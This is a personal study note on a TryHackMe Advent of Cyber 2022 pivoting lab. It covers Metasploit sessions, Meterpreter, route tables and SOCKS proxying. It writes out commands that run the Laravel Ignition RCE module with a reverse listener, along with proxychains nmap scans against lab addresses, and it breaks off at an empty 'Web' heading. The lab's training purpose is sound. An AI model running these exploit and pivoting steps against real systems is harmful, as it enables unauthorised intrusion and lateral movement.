**Title:** Day 9 - THM 2022
**Tags:** [[Advent Cyber 2022]]
**Topics:** #TryHackMe #Pivoting

---
# Concepts
## Docker
Package applications and the associated dependencies into a single unit called “image”. This image can be shared and run as a container (Locally or remotely on a production server).
Common wait to know if the application is a docker container is to verify the existence of a `.docker.env` file.

## Metasploit
Powerful penetration testing tool for gaining initial access to systems. You can also perform post-expoiltation and pivoting to other applications and systems.

### Metasploit session
After exploiting a remote target with a Metasploit module, a session is often opened by default. These sessions are Command Shells or Meterpreter session (Allow command execution).

```Metasploit Console
# view sessions
sessions

# upgrade the last opened session to Meterpreter
sessions -u -1

# interact with a session
sessions -i session_id

# Background the currently interactive session, and go back to the Metasploit prompt
background
```

## Meterpreter
Advanced payload that provides interactive access to compromised system. Can run commands on remote target, including uploading/downloading files and pivoting.

```Meterpreter Commands
# Get information about the remote system, such as OS
sysinfo

# Upload a file or directory
upload local_file.txt

# Display interfaces
ipconfig

# Resolve a set of host names on the target to IP addresses - useful for pivoting
resolve remote_service1 remote_service2
```

## Pivoting
Once a system is compromised, it can allow the attacker to find more systems on the network and exploit them. We can use nmap or arp-scan to find more machines and services.
![[Pasted image 20221210101259.png]]


## Using Metasploit
1. Open Metasploit with `msfconsole` command.

2. Select the most useful Metasploit module for this attack (laravel).
```Metasploit
# To search for a module, use the ‘search’ command:
msf6 > search laravel

# Load a module with the ‘use’ command
msf6 > use multi/php/ignition_laravel_debug_rce

# view the information about the module, including the module options, description, CVE details, etc
msf6 exploit(multi/php/ignition_laravel_debug_rce) > info
```

3. Now you can view the options, set options and run the module.
```Metasploit Commands
# View the available options to set
show options

# Set the target host and logging
set rhost MACHINE_IP
set verbose true

# Set the payload listening address; this is the IP address of the host running Metasploit
set lhost LISTEN_IP

# show options again
show options

# Run or check the module
check
run
```

## Meterpreter to pivot
Metasploit has an internal routing table that can be modified with `route` command. This determines where to send network traffic through.
```Metasploit Commands
# Example usage
route [add/remove] subnet netmask [comm/sid]

# Configure the routing table to send packets destined for 172.17.0.1 to the latest opened session
route add 172.17.0.1/32 -1

# Configure the routing table to send packets destined for 172.28.101.48/29 subnet to the latest opened session
route add 172.28.10.48/29 -1

# Output the routing table
route print
```

## Socks Proxy
Intermediate server that supports relaying networking traffic between two machines. Allows the implementation of pivoting technique. You can run Socks Proxy locally or in the compromised system. This can be achieved using `auxiliary/server/socks_proxy` module.

```Metasploit Commands
use auxiliary/server/socks_proxy
run srvhost=127.0.0.1 srvport=9050 version=4a
```

Tools such as `curl` supports sending requests through a socks proxy server via `--proxy` flag.
```sh
curl --proxy socks4a://localhost:9050 http://10.10.40.65
```

ProxyChain can intercept the tool's request to open a new network connection and route the request through a socks proxy instead.
```sh
proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 10.10.40.65
```

# Challenge
## Enumeration
```sh
└─# nmap -p- 10.10.40.65 -Pn -n -v
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:C2:4A:6E:C9:01 (Unknown)
```

## Web
